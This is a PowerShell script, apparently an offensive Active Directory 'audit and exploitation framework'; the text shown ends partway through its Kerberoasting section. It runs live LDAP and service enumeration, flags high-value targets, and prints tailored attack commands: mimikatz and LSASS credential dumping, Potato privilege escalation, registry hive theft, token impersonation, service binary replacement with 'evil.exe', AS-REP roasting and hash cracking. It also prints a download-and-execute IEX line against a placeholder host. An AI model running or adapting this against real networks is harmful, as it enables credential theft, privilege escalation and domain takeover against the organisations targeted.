# ============================================================================
# NATIVE POWERSHELL SERVICE ACCOUNT AUDIT & EXPLOITATION FRAMEWORK
# ============================================================================
# Purpose: Comprehensive AD/Service enumeration using only native tools
# No external dependencies - Pure PowerShell & LDAP
# Version: 2.1 - Syntax Fixed
# ============================================================================

function Invoke-NativeADExploitAudit {
    [CmdletBinding()]
    param(
        [switch]$FullEnumeration,
        [switch]$ExportToCsv,
        [string]$OutputDirectory = ".\AuditOutput_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    )
    
    $script:StartTime = Get-Date
    $script:Results = @{
        ServiceAccounts = @()
        ASREPUsers = @()
        KerberoastUsers = @()
        DelegationComputers = @()
        Processes = @()
        Tickets = @()
    }
    
    # Create output directory
    if ($ExportToCsv -and -not (Test-Path $OutputDirectory)) {
        New-Item -Path $OutputDirectory -ItemType Directory -Force | Out-Null
    }
    
    # Banner
    Write-Host ""
    Write-Host "================================================================================" -ForegroundColor Cyan
    Write-Host "          NATIVE POWERSHELL AD SECURITY AUDIT FRAMEWORK" -ForegroundColor Cyan
    Write-Host "          Full Enumeration + Exploitation Commands" -ForegroundColor Cyan
    Write-Host "          No External Dependencies Required" -ForegroundColor Cyan
    Write-Host "================================================================================" -ForegroundColor Cyan

    Write-Host ""
    Write-Host "[+] Audit Started: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Gray
    Write-Host "[+] Execution Context: $env:USERDOMAIN\$env:USERNAME @ $env:COMPUTERNAME" -ForegroundColor Gray
    
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Write-Host "[+] Administrator Rights: $(if($isAdmin){'YES'}else{'NO'})" -ForegroundColor $(if($isAdmin){'Red'}else{'Yellow'})
    
    # Get domain info
    $computerSystem = Get-WmiObject Win32_ComputerSystem
    $domainJoined = $computerSystem.PartOfDomain
    $domain = $computerSystem.Domain
    
    Write-Host "[+] Domain Status: $(if($domainJoined){'Joined to ' + $domain}else{'Workgroup'})" -ForegroundColor $(if($domainJoined){'Green'}else{'Yellow'})
    Write-Host ""
    
    # ========================================================================
    # SECTION 1: LOCAL PRIVILEGE & CREDENTIAL ENUMERATION
    # ========================================================================
    Write-Host ""
    Write-Host "================================================================================" -ForegroundColor Green
    Write-Host "[SECTION 1] LOCAL PRIVILEGE & CREDENTIAL ENUMERATION" -ForegroundColor Green
    Write-Host "================================================================================" -ForegroundColor Green
    
    # Current user privileges
    Write-Host ""
    Write-Host "[+] Current User Privileges Analysis:" -ForegroundColor Cyan
    $privOutput = whoami /priv 2>$null
    
    $dangerousPrivs = @{
        'SeDebugPrivilege' = 'Process debugging - LSASS credential dumping'
        'SeTcbPrivilege' = 'Act as part of operating system - Token creation'
        'SeBackupPrivilege' = 'Backup files and directories - Read any file'
        'SeRestorePrivilege' = 'Restore files and directories - Write any file'
        'SeImpersonatePrivilege' = 'Impersonate a client after authentication - Potato attacks'
        'SeAssignPrimaryTokenPrivilege' = 'Replace process-level token'
        'SeLoadDriverPrivilege' = 'Load and unload device drivers - Kernel exploitation'
        'SeTakeOwnershipPrivilege' = 'Take ownership of files or objects'
    }
    
    $enabledPrivileges = @()
    foreach ($privName in $dangerousPrivs.Keys) {
        if ($privOutput -match "$privName\s+.*Enabled") {
            $enabledPrivileges += $privName
            $privDescription = $dangerousPrivs[$privName]
            
            Write-Host ""
            Write-Host "  [!] $privName - ENABLED" -ForegroundColor Red
            Write-Host "      Description: $privDescription" -ForegroundColor Yellow
            Write-Host "      Exploitation Commands:" -ForegroundColor White
            
            # Generate exploits based on privilege type
            if ($privName -eq 'SeDebugPrivilege') {
                Write-Host "        > mimikatz.exe `"privilege::debug`" `"sekurlsa::logonpasswords`" `"exit`"" -ForegroundColor Yellow
                Write-Host "        > procdump.exe -accepteula -ma lsass.exe lsass.dmp" -ForegroundColor Yellow
                Write-Host "        > rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump [PID] lsass.dmp full" -ForegroundColor Yellow
            }
            elseif ($privName -eq 'SeImpersonatePrivilege') {
                Write-Host "        > PrintSpoofer.exe -i -c powershell" -ForegroundColor Yellow
                Write-Host "        > JuicyPotato.exe -l 1337 -p cmd.exe -a `"/c whoami`" -t *" -ForegroundColor Yellow
                Write-Host "        > GodPotato.exe -cmd `"cmd /c whoami`"" -ForegroundColor Yellow
            }
            elseif ($privName -eq 'SeBackupPrivilege') {
                Write-Host "        > reg save HKLM\SAM sam.hive" -ForegroundColor Yellow
                Write-Host "        > reg save HKLM\SYSTEM system.hive" -ForegroundColor Yellow
                Write-Host "        > reg save HKLM\SECURITY security.hive" -ForegroundColor Yellow
                Write-Host "        > impacket-secretsdump -sam sam.hive -system system.hive LOCAL" -ForegroundColor Yellow
            }
            elseif ($privName -eq 'SeRestorePrivilege') {
                Write-Host "        > copy /y evil.exe `"C:\Windows\System32\utilman.exe`"" -ForegroundColor Yellow
                Write-Host "        > Replace DLL files for DLL hijacking" -ForegroundColor Yellow
            }
            elseif ($privName -eq 'SeLoadDriverPrivilege') {
                Write-Host "        > EoPLoadDriver.exe System\CurrentControlSet\MyService driver.sys" -ForegroundColor Yellow
            }
            elseif ($privName -eq 'SeTakeOwnershipPrivilege') {
                Write-Host "        > takeown /f C:\Windows\System32\config\SAM" -ForegroundColor Yellow
                Write-Host "        > icacls C:\Windows\System32\config\SAM /grant administrators:F" -ForegroundColor Yellow
            }
        }
    }
    
    if ($enabledPrivileges.Count -eq 0) {
        Write-Host "  [+] No dangerous privileges enabled" -ForegroundColor Green
    } else {
        Write-Host ""
        Write-Host "  [!] TOTAL DANGEROUS PRIVILEGES ENABLED: $($enabledPrivileges.Count)" -ForegroundColor Red
    }
    
    # Credential Manager enumeration
    Write-Host ""
    Write-Host "[+] Windows Credential Manager Enumeration:" -ForegroundColor Cyan
    Write-Host "  [CREDENTIAL DUMPING COMMANDS]:" -ForegroundColor Red
    Write-Host "    # Method 1: Mimikatz" -ForegroundColor White
    Write-Host "    mimikatz.exe `"privilege::debug`" `"sekurlsa::logonpasswords`" `"exit`"" -ForegroundColor Yellow
    Write-Host "    mimikatz.exe `"privilege::debug`" `"vault::cred`" `"exit`"" -ForegroundColor Yellow
    Write-Host "    mimikatz.exe `"privilege::debug`" `"lsadump::cache`" `"exit`"" -ForegroundColor Yellow
    
    Write-Host ""
    Write-Host "    # Method 2: VaultCmd (Native)" -ForegroundColor White
    Write-Host "    vaultcmd /listcreds:`"Windows Credentials`" /all" -ForegroundColor Yellow
    Write-Host "    vaultcmd /listcreds:`"Web Credentials`" /all" -ForegroundColor Yellow
    
    Write-Host ""
    Write-Host "    # Method 3: Extract from DPAPI" -ForegroundColor White
    Write-Host "    mimikatz.exe `"dpapi::cred /in:C:\Users\[USER]\AppData\Local\Microsoft\Credentials\[GUID]`"" -ForegroundColor Yellow
    
    # Kerberos ticket analysis
    Write-Host ""
    Write-Host "[+] Kerberos Ticket Analysis:" -ForegroundColor Cyan
    $ticketOutput = klist 2>$null
    
    if ($LASTEXITCODE -eq 0) {
        $tickets = @()
        $currentTicket = $null
        
        foreach ($line in $ticketOutput -split "`n") {
            if ($line -match "^\s*Server:\s+(.+)") {
                if ($currentTicket) { 
                    $tickets += $currentTicket 
                }
                $currentTicket = @{
                    Server = $matches[1].Trim()
                    Number = $tickets.Count + 1
                }
            } 
            elseif ($line -match "^\s+End Time:\s+(.+)" -and $currentTicket) {
                $currentTicket.EndTime = $matches[1].Trim()
            }
        }
        
        if ($currentTicket) { 
            $tickets += $currentTicket 
        }
        
        if ($tickets.Count -gt 0) {
            Write-Host "  Found $($tickets.Count) cached Kerberos tickets:" -ForegroundColor Yellow
            
            foreach ($ticket in $tickets) {
                Write-Host ""
                Write-Host "  [Ticket #$($ticket.Number)]" -ForegroundColor White
                Write-Host "    Server: $($ticket.Server)" -ForegroundColor Gray
                if ($ticket.EndTime) {
                    Write-Host "    Expires: $($ticket.EndTime)" -ForegroundColor Gray
                }
                
                # Check for interesting tickets
                if ($ticket.Server -match 'krbtgt') {
                    Write-Host "    [!] TGT - Can request service tickets!" -ForegroundColor Red
                } 
                elseif ($ticket.Server -match 'cifs|ldap|http|mssql') {
                    Write-Host "    [+] Service ticket - Potential lateral movement" -ForegroundColor Yellow
                }
                
                $script:Results.Tickets += $ticket
            }
            
            Write-Host ""
            Write-Host "  [TICKET MANIPULATION COMMANDS]:" -ForegroundColor Red
            
            Write-Host ""
            Write-Host "    # Export Tickets (Mimikatz)" -ForegroundColor White
            Write-Host "    mimikatz.exe `"privilege::debug`" `"sekurlsa::tickets /export`" `"exit`"" -ForegroundColor Yellow
            
            Write-Host ""
            Write-Host "    # Export Tickets (Rubeus)" -ForegroundColor White
            Write-Host "    Rubeus.exe dump /nowrap" -ForegroundColor Yellow
            Write-Host "    Rubeus.exe dump /service:krbtgt /nowrap" -ForegroundColor Yellow
            Write-Host "    Rubeus.exe dump /luid:0x[LUID] /nowrap" -ForegroundColor Yellow
            
            Write-Host ""
            Write-Host "    # Pass-the-Ticket (PTT)" -ForegroundColor White
            Write-Host "    mimikatz.exe `"kerberos::ptt [ticket.kirbi]`" `"exit`"" -ForegroundColor Yellow
            Write-Host "    Rubeus.exe ptt /ticket:[base64_ticket]" -ForegroundColor Yellow
            
            Write-Host ""
            Write-Host "    # Ticket Purging (Cleanup)" -ForegroundColor White
            Write-Host "    klist purge" -ForegroundColor Yellow
            
        } else {
            Write-Host "  No cached tickets found" -ForegroundColor Gray
        }
    } else {
        Write-Host "  Unable to enumerate Kerberos tickets" -ForegroundColor Gray
    }
    
    # ========================================================================
    # SECTION 2: SERVICE ACCOUNT DEEP DIVE
    # ========================================================================
    Write-Host ""
    Write-Host "================================================================================" -ForegroundColor Green
    Write-Host "[SECTION 2] SERVICE ACCOUNT DEEP DIVE & CREDENTIAL EXTRACTION" -ForegroundColor Green
    Write-Host "================================================================================" -ForegroundColor Green
    
    Write-Host ""
    Write-Host "[+] Enumerating All Windows Services:" -ForegroundColor Cyan
    $allServices = Get-CimInstance Win32_Service -Property Name,StartName,State,StartMode,ProcessId,PathName,Description,DisplayName
    
    # Categorize services
    $serviceCategories = @{
        DomainAccount = @()
        LocalAccount = @()
        VirtualAccount = @()
        ManagedServiceAccount = @()
        SystemAccounts = @()
    }
    
    foreach ($svc in $allServices) {
        if (-not $svc.StartName) { 
            continue 
        }
        
        $startName = $svc.StartName
        
        if ($startName -match '^[A-Za-z0-9_-]+\\.+') {
            # Domain account format: DOMAIN\user
            $serviceCategories.DomainAccount += $svc
        } 
        elseif ($startName -match '^\.\\.+' -or ($startName -notmatch '\\' -and $startName -notmatch '@' -and $startName -ne 'LocalSystem')) {
            # Local account format
            $serviceCategories.LocalAccount += $svc
        } 
        elseif ($startName -match 'NT SERVICE\\') {
            $serviceCategories.VirtualAccount += $svc
        } 
        else {
            $serviceCategories.SystemAccounts += $svc
        }
    }
    
    # Domain Service Accounts - HIGH PRIORITY
    if ($serviceCategories.DomainAccount.Count -gt 0) {
        Write-Host ""
        Write-Host "  [!] DOMAIN SERVICE ACCOUNTS DETECTED: $($serviceCategories.DomainAccount.Count)" -ForegroundColor Red
        Write-Host "  These accounts pose significant security risks!" -ForegroundColor Red
        
        foreach ($svc in $serviceCategories.DomainAccount) {
            Write-Host ""
            Write-Host "  ============================================================================" -ForegroundColor Yellow
            Write-Host "  Service: $($svc.Name)" -ForegroundColor Yellow
            Write-Host "  ============================================================================" -ForegroundColor Yellow
            
            Write-Host "    Display Name: $($svc.DisplayName)" -ForegroundColor White
            Write-Host "    Account: $($svc.StartName)" -ForegroundColor Red
            Write-Host "    State: $($svc.State)" -ForegroundColor $(if($svc.State -eq 'Running'){'Green'}else{'Gray'})
            Write-Host "    Start Mode: $($svc.StartMode)" -ForegroundColor Gray
            Write-Host "    Binary: $($svc.PathName)" -ForegroundColor Gray
            
            if ($svc.State -eq 'Running' -and $svc.ProcessId -gt 0) {
                Write-Host "    Process ID: $($svc.ProcessId)" -ForegroundColor Gray
                
                try {
                    $proc = Get-Process -Id $svc.ProcessId -ErrorAction SilentlyContinue
                    if ($proc) {
                        Write-Host "    Memory Usage: $([math]::Round($proc.WorkingSet64/1MB,2)) MB" -ForegroundColor Gray
                        Write-Host "    Handles: $($proc.HandleCount)" -ForegroundColor Gray
                        Write-Host "    Threads: $($proc.Threads.Count)" -ForegroundColor Gray
                    }
                } catch {}
            }
            
            $script:Results.ServiceAccounts += [PSCustomObject]@{
                Name = $svc.Name
                DisplayName = $svc.DisplayName
                Account = $svc.StartName
                State = $svc.State
                ProcessId = $svc.ProcessId
                Path = $svc.PathName
            }
        }
        
        Write-Host ""
        Write-Host "  ============================================================================" -ForegroundColor Red
        Write-Host "  CREDENTIAL EXTRACTION METHODOLOGIES" -ForegroundColor Red
        Write-Host "  ============================================================================" -ForegroundColor Red
        
        Write-Host ""
        Write-Host "  [METHOD 1] LSA Secrets Extraction:" -ForegroundColor White
        Write-Host "    Description: Service account passwords stored in LSA Secrets" -ForegroundColor Gray
        Write-Host "    Requirement: SYSTEM or SeBackupPrivilege" -ForegroundColor Gray
        Write-Host ""
        Write-Host "    Commands:" -ForegroundColor Cyan
        Write-Host "      # Using Mimikatz (online):" -ForegroundColor White
        Write-Host "      mimikatz.exe `"privilege::debug`" `"token::elevate`" `"lsadump::secrets`" `"exit`"" -ForegroundColor Yellow
        Write-Host ""
        Write-Host "      # Using Registry Dump (offline):" -ForegroundColor White
        Write-Host "      reg save HKLM\SECURITY C:\temp\security.hive" -ForegroundColor Yellow
        Write-Host "      reg save HKLM\SYSTEM C:\temp\system.hive" -ForegroundColor Yellow
        Write-Host "      impacket-secretsdump -security security.hive -system system.hive LOCAL" -ForegroundColor Yellow
        Write-Host ""
        Write-Host "      # Using CrackMapExec:" -ForegroundColor White
        Write-Host "      crackmapexec smb [TARGET] -u [USER] -p [PASS] --lsa" -ForegroundColor Yellow
        Write-Host "      crackmapexec smb [TARGET] -u [USER] -H [NTLM] --lsa" -ForegroundColor Yellow
        
        Write-Host ""
        Write-Host "  [METHOD 2] Process Memory Dump:" -ForegroundColor White
        Write-Host "    Description: Extract credentials from running service process" -ForegroundColor Gray
        Write-Host "    Requirement: SeDebugPrivilege or same user context" -ForegroundColor Gray
        Write-Host ""
        Write-Host "    Commands:" -ForegroundColor Cyan
        foreach ($svc in $serviceCategories.DomainAccount | Where-Object {$_.State -eq 'Running'} | Select-Object -First 3) {
            Write-Host "      # Service: $($svc.Name) (PID: $($svc.ProcessId))" -ForegroundColor White
            Write-Host "      procdump.exe -accepteula -ma $($svc.ProcessId) $($svc.Name).dmp" -ForegroundColor Yellow
            Write-Host "      mimikatz.exe `"sekurlsa::minidump $($svc.Name).dmp`" `"sekurlsa::logonpasswords`" `"exit`"" -ForegroundColor Yellow
            Write-Host "      strings -n 8 $($svc.Name).dmp | findstr /i `"password pass pwd`"" -ForegroundColor Yellow
            Write-Host ""
        }
        
        Write-Host "  [METHOD 3] Service Configuration Query:" -ForegroundColor White
        Write-Host "    Description: View service configuration" -ForegroundColor Gray
        Write-Host ""
        Write-Host "    Commands:" -ForegroundColor Cyan
        foreach ($svc in $serviceCategories.DomainAccount | Select-Object -First 3) {
            Write-Host "      sc qc `"$($svc.Name)`"" -ForegroundColor Yellow
            Write-Host "      sc queryex `"$($svc.Name)`"" -ForegroundColor Yellow
        }
        
        Write-Host ""
        Write-Host "  [METHOD 4] Token Impersonation:" -ForegroundColor White
        Write-Host "    Description: Steal service account token from running process" -ForegroundColor Gray
        Write-Host "    Requirement: SeImpersonatePrivilege or admin" -ForegroundColor Gray
        Write-Host ""
        Write-Host "    Commands:" -ForegroundColor Cyan
        Write-Host "      # Using Incognito:" -ForegroundColor White
        Write-Host "      incognito.exe list_tokens -u" -ForegroundColor Yellow
        foreach ($svc in $serviceCategories.DomainAccount | Select-Object -First 2) {
            $parts = $svc.StartName -split '\\'
            if ($parts.Count -eq 2) {
                $domain = $parts[0]
                $username = $parts[1]
                Write-Host "      incognito.exe execute -c `"$domain\$username`" cmd.exe" -ForegroundColor Yellow
            }
        }
        Write-Host ""
        Write-Host "      # Using Invoke-TokenManipulation:" -ForegroundColor White
        Write-Host "      IEX (New-Object Net.WebClient).DownloadString('http://[IP]/Invoke-TokenManipulation.ps1')" -ForegroundColor Yellow
        Write-Host "      Invoke-TokenManipulation -ShowAll" -ForegroundColor Yellow
        foreach ($svc in $serviceCategories.DomainAccount | Select-Object -First 2) {
            Write-Host "      Invoke-TokenManipulation -ImpersonateUser -Username `"$($svc.StartName)`"" -ForegroundColor Yellow
        }
        
        Write-Host ""
        Write-Host "  [METHOD 5] Kerberoasting (if SPN set):" -ForegroundColor White
        Write-Host "    Description: Request TGS for service account and crack offline" -ForegroundColor Gray
        Write-Host ""
        Write-Host "    Commands:" -ForegroundColor Cyan
        Write-Host "      # Enumerate SPNs:" -ForegroundColor White
        Write-Host "      setspn -T $domain -Q */*" -ForegroundColor Yellow
        Write-Host ""
        Write-Host "      # Request TGS tickets:" -ForegroundColor White
        foreach ($svc in $serviceCategories.DomainAccount | Select-Object -First 3) {
            $parts = $svc.StartName -split '\\'
            if ($parts.Count -eq 2) {
                $username = $parts[1]
                Write-Host "      Rubeus.exe kerberoast /user:$username /nowrap" -ForegroundColor Yellow
            }
        }
        Write-Host ""
        Write-Host "      # Crack hashes:" -ForegroundColor White
        Write-Host "      hashcat -m 13100 -a 0 tickets.txt wordlist.txt --force" -ForegroundColor Yellow
        Write-Host "      john --wordlist=wordlist.txt tickets.txt" -ForegroundColor Yellow
        
        Write-Host ""
        Write-Host "  [METHOD 6] Binary Hijacking:" -ForegroundColor White
        Write-Host "    Description: Replace service binary with malicious version" -ForegroundColor Gray
        Write-Host ""
        Write-Host "    Commands:" -ForegroundColor Cyan
        foreach ($svc in $serviceCategories.DomainAccount | Select-Object -First 2) {
            Write-Host "      # Check permissions on service binary:" -ForegroundColor White
            $binaryPath = $svc.PathName -replace '"',''
            Write-Host "      icacls `"$binaryPath`"" -ForegroundColor Yellow
            Write-Host "      # If writable, replace:" -ForegroundColor White
            Write-Host "      sc stop `"$($svc.Name)`"" -ForegroundColor Yellow
            Write-Host "      copy /y evil.exe `"$binaryPath`"" -ForegroundColor Yellow
            Write-Host "      sc start `"$($svc.Name)`"" -ForegroundColor Yellow
            Write-Host ""
        }
        
    } else {
        Write-Host ""
        Write-Host "  [+] No domain service accounts found" -ForegroundColor Green
    }
    
    # Other service categories summary
    if ($serviceCategories.LocalAccount.Count -gt 0) {
        Write-Host ""
        Write-Host "  [+] Local Service Accounts: $($serviceCategories.LocalAccount.Count)" -ForegroundColor Yellow
    }
    if ($serviceCategories.ManagedServiceAccount.Count -gt 0) {
        Write-Host "  [+] Managed Service Accounts (MSA/gMSA): $($serviceCategories.ManagedServiceAccount.Count)" -ForegroundColor Green
    }
    if ($serviceCategories.VirtualAccount.Count -gt 0) {
        Write-Host "  [+] Virtual Service Accounts: $($serviceCategories.VirtualAccount.Count)" -ForegroundColor Gray
    }
    
    # ========================================================================
    # SECTION 3: ACTIVE DIRECTORY LDAP ENUMERATION
    # ========================================================================
    if ($domainJoined) {
        Write-Host ""
        Write-Host "================================================================================" -ForegroundColor Green
        Write-Host "[SECTION 3] ACTIVE DIRECTORY LDAP ATTACK SURFACE ENUMERATION" -ForegroundColor Green
        Write-Host "================================================================================" -ForegroundColor Green
        
        Write-Host ""
        Write-Host "[+] Domain: $domain" -ForegroundColor Cyan
        
        # Get domain DN
        $domainDN = "DC=" + ($domain -replace '\.',',DC=')
        Write-Host "[+] Domain DN: $domainDN" -ForegroundColor Gray
        
        # ===== AS-REP ROASTING =====
        Write-Host ""
        Write-Host "[+] AS-REP Roastable Accounts (No Kerberos Pre-Authentication):" -ForegroundColor Cyan
        Write-Host "  Description: Accounts vulnerable to AS-REP roasting attack" -ForegroundColor Gray
        Write-Host "  Risk Level: CRITICAL - Offline password cracking possible" -ForegroundColor Red
        
        try {
            # LDAP filter for DONT_REQ_PREAUTH
            $searcher = [adsisearcher]'(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
            $searcher.PageSize = 1000
            $searcher.PropertiesToLoad.AddRange(@(
                'samaccountname','distinguishedname','pwdlastset',
                'lastlogontimestamp','description','memberof','admincount'
            ))
            
            $asrepUsers = $searcher.FindAll()
            
            if ($asrepUsers.Count -gt 0) {
                Write-Host ""
                Write-Host "  [!] VULNERABLE ACCOUNTS FOUND: $($asrepUsers.Count)" -ForegroundColor Red
                
                foreach ($user in $asrepUsers) {
                    $sam = $user.Properties['samaccountname'][0]
                    $dn = $user.Properties['distinguishedname'][0]
                    
                    Write-Host ""
                    Write-Host "  ============================================================================" -ForegroundColor Red
                    Write-Host "  User: $sam" -ForegroundColor Red
                    Write-Host "  ============================================================================" -ForegroundColor Red
                    
                    Write-Host "    Distinguished Name: $dn" -ForegroundColor Gray
                    
                    # Password age
                    if ($user.Properties['pwdlastset'] -and $user.Properties['pwdlastset'][0]) {
                        try {
                            $pwdDate = [datetime]::FromFileTime([int64]$user.Properties['pwdlastset'][0])
                            $daysOld = (New-TimeSpan -Start $pwdDate -End (Get-Date)).Days
                            Write-Host "    Password Age: $daysOld days (Last Set: $($pwdDate.ToString('yyyy-MM-dd')))" -ForegroundColor $(if($daysOld -gt 365){'Red'}else{'Yellow'})
                            
                            if ($daysOld -gt 365) {
                                Write-Host "    [!] Password over 1 year old - Higher crack probability!" -ForegroundColor Red
                            }
                        } catch {}
                    }
                    
                    # Admin count
                    if ($user.Properties['admincount'] -and $user.Properties['admincount'][0] -eq 1) {
                        Write-Host "    [!] PRIVILEGED ACCOUNT - AdminCount = 1" -ForegroundColor Red
                    }
                    
                    # Group memberships
                    if ($user.Properties['memberof']) {
                        $adminGroups = $user.Properties['memberof'] | Where-Object { 
                            $_ -match 'Domain Admins|Enterprise Admins|Administrators|Schema Admins' 
                        }
                        if ($adminGroups) {
                            Write-Host "    [!] HIGH-VALUE TARGET - Privileged Group Member:" -ForegroundColor Red
                            foreach ($grp in $adminGroups) {
                                $grpName = ($grp -split ',')[0] -replace 'CN=',''
                                Write-Host "      - $grpName" -ForegroundColor Red
                            }
                        }
                    }
                    
                    $script:Results.ASREPUsers += [PSCustomObject]@{
                        Username = $sam
                        DN = $dn
                    }
                }
                
                Write-Host ""
                Write-Host "  ============================================================================" -ForegroundColor Red
                Write-Host "  AS-REP ROASTING ATTACK METHODOLOGY" -ForegroundColor Red
                Write-Host "  ============================================================================" -ForegroundColor Red
                
                Write-Host ""
                Write-Host "  [ATTACK METHOD 1] Using Rubeus (Windows):" -ForegroundColor White
                Write-Host "    # Roast all AS-REP roastable users:" -ForegroundColor Cyan
                Write-Host "    Rubeus.exe asreproast /format:hashcat /nowrap" -ForegroundColor Yellow
                Write-Host "    Rubeus.exe asreproast /format:john /nowrap" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "    # Target specific users:" -ForegroundColor Cyan
                foreach ($user in $asrepUsers | Select-Object -First 3) {
                    $sam = $user.Properties['samaccountname'][0]
                    Write-Host "    Rubeus.exe asreproast /user:$sam /format:hashcat /nowrap" -ForegroundColor Yellow
                }
                
                Write-Host ""
                Write-Host "    # Output to file:" -ForegroundColor Cyan
                Write-Host "    Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep_hashes.txt" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "  [ATTACK METHOD 2] Using Impacket (Linux):" -ForegroundColor White
                Write-Host "    # With credentials:" -ForegroundColor Cyan
                Write-Host "    impacket-GetNPUsers $domain/[user]:[pass] -dc-ip [DC_IP] -request -format hashcat" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "    # Without credentials (usersfile):" -ForegroundColor Cyan
                Write-Host "    impacket-GetNPUsers $domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "    # Target specific user without password:" -ForegroundColor Cyan
                foreach ($user in $asrepUsers | Select-Object -First 2) {
                    $sam = $user.Properties['samaccountname'][0]
                    Write-Host "    impacket-GetNPUsers $domain/$sam -no-pass -format hashcat" -ForegroundColor Yellow
                }
                
                Write-Host ""
                Write-Host "  [CRACKING METHODOLOGY]:" -ForegroundColor White
                Write-Host "    # Hashcat Commands:" -ForegroundColor Cyan
                Write-Host "    hashcat -m 18200 -a 0 asrep_hashes.txt wordlist.txt" -ForegroundColor Yellow
                Write-Host "    hashcat -m 18200 -a 0 asrep_hashes.txt wordlist.txt -r rules/best64.rule" -ForegroundColor Yellow
                Write-Host "    hashcat -m 18200 -a 3 asrep_hashes.txt ?u?l?l?l?l?l?l?d?d" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "    # John the Ripper Commands:" -ForegroundColor Cyan
                Write-Host "    john --wordlist=wordlist.txt asrep_hashes.txt" -ForegroundColor Yellow
                Write-Host "    john --wordlist=wordlist.txt --rules asrep_hashes.txt" -ForegroundColor Yellow
                
                Write-Host ""
                Write-Host "  [POST-EXPLOITATION]:" -ForegroundColor White
                Write-Host "    # Once password cracked, validate:" -ForegroundColor Cyan
                foreach ($user in $asrepUsers | Select-Object -First 2) {
                    $sam = $user.Properties['samaccountname'][0]
                    Write-Host "    crackmapexec smb [DC_IP] -u $sam -p [CRACKED_PASSWORD]" -ForegroundColor Yellow
                }
                Write-Host ""
                Write-Host "    # If privileged, dump credentials:" -ForegroundColor Cyan
                Write-Host "    crackmapexec smb [DC_IP] -u [USER] -p [PASS] --sam" -ForegroundColor Yellow
                Write-Host "    crackmapexec smb [DC_IP] -u [USER] -p [PASS] --lsa" -ForegroundColor Yellow
                Write-Host "    crackmapexec smb [DC_IP] -u [USER] -p [PASS] --ntds" -ForegroundColor Yellow
                
            } else {
                Write-Host "  [+] No AS-REP roastable accounts found - Good!" -ForegroundColor Green
            }
        } catch {
            Write-Host "  [!] Error enumerating AS-REP users: $_" -ForegroundColor Red
        }
        
        # ===== KERBEROASTING =====
        Write-Host ""
        Write-Host "[+] Kerberoastable Accounts (Service Principal Names):" -ForegroundColor Cyan
        Write-Host "  Description: User accounts with SPNs set - vulnerable to Kerberoasting" -ForegroundColor Gray
        Write-Host "  Risk Level: HIGH - Offline password cracking possible" -ForegroundColor Red
        
        try {
            $searcher = [adsisearcher]'(&(objectCategory=user)(servicePrincipalName=*))'
            $searcher.PageSize = 1000
            $searcher.PropertiesToLoad.AddRange(@(
                'samaccountname','serviceprincipalname','distinguishedname',
                'pwdlastset','lastlogontimestamp','memberof','description','admincount'
            ))
            
            $spnUsers = $searcher.FindAll()
            
            if ($spnUsers.Count -gt 0) {
                Write-Host ""
                Write-Host "  [!] KERBEROASTABLE ACCOUNTS FOUND: $($spnUsers.Count)" -ForegroundColor Red
                
                foreach ($user in $spnUsers) {
                    $sam = $user.Properties['samaccountname'][0]
                    $spns = $user.Properties['serviceprincipalname']
                    $dn = $user.Properties['distinguishedname'][0]
                    
                    Write-Host ""
                    Write-Host "  ============================================================================" -ForegroundColor Red
                    Write-Host "  User: $sam" -ForegroundColor Red
                    Write-Host "  ============================================================================" -ForegroundColor Red
                    
                    Write-Host "    Distinguished Name: $dn" -ForegroundColor Gray
                    Write-Host "    Service Principal Names ($($spns.Count)):" -ForegroundColor Yellow
                    foreach ($spn in $spns) {
                        Write-Host "      - $spn" -ForegroundColor Yellow
                        
                        # Highlight interesting SPNs
                        if ($spn -match 'MSSQLSvc') {
                            Write-Host "        [!] SQL Server service - Often privileged!" -ForegroundColor Red
                        } 
                        elseif ($spn -match 'HTTP') {
                            Write-Host "        [+] HTTP service - Potential web server" -ForegroundColor Yellow
                        }
                    }
                    
                    # Password age
                    if ($user.Properties['pwdlastset'] -and $user.Properties['pwdlastset'][0]) {
                        try {
                            $pwdDate = [datetime]::FromFileTime([int64]$user.Properties['pwdlastset'][0])
                            $daysOld = (New-TimeSpan -Start $pwdDate -End (Get-Date)).Days
                            Write-Host "    Password Age: $daysOld days (Set: $($pwdDate.ToString('yyyy-MM-dd')))" -ForegroundColor $(if($daysOld -gt 365){'Red'}elseif($daysOld -gt 180){'Yellow'}else{'Green'})
                            
                            if ($daysOld -gt 365) {
                                Write-Host "    [!] Password VERY OLD - Extremely high crack probability!" -ForegroundColor Red
                            } 
                            elseif ($daysOld -gt 180) {
                                Write-Host "    [!] Password moderately old - Higher crack probability" -ForegroundColor Yellow
                            }
                        } catch {}
                    }
                    
                    # Admin count
                    if ($user.Properties['admincount'] -and $user.Properties['admincount'][0] -eq 1) {
                        Write-Host "    [!] CRITICAL TARGET - AdminCount = 1 (Privileged Account)" -ForegroundColor Red
                    }
                    
                    # Group memberships
                    if ($user.Properties['memberof']) {
                        $privGroups = $user.Properties['memberof'] | Where-Object { 
                            $_ -match 'Domain Admins|Enterprise Admins|Administrators|Schema Admins' 
                        }
                        if ($privGroups) {
                            Write-Host "    [!] HIGH-VALUE TARGET - Admin Group Member:" -ForegroundColor Red
                            foreach ($grp in $privGroups) {
                                $grpName = ($grp -split ',')[0] -replace 'CN=',''
                                Write-Host "      - $grpName" -ForegroundColor Red
                            }
                        }
                    }
                    
                    $script:Results.KerberoastUsers += [PSCustomObject]@{
                        Username = $sam
                        SPNCount = $spns.Count
                        SPNs = ($spns -join '; ')
                    }
                }
                
                Write-Host ""
                Write-Host "  ============================================================================" -ForegroundColor Red
                Write-Host "  KERBEROASTING ATTACK METHODOLOGY" -ForegroundColor Red
                Write-Host "  ============================================================================" -ForegroundColor Red
                
                Write-Host ""
                Write-Host "  [ATTACK METHOD 1] Using Rubeus (Windows - RECOMMENDED):" -ForegroundColor White
                Write-Host "    # Kerberoast all SPN users:" -ForegroundColor Cyan
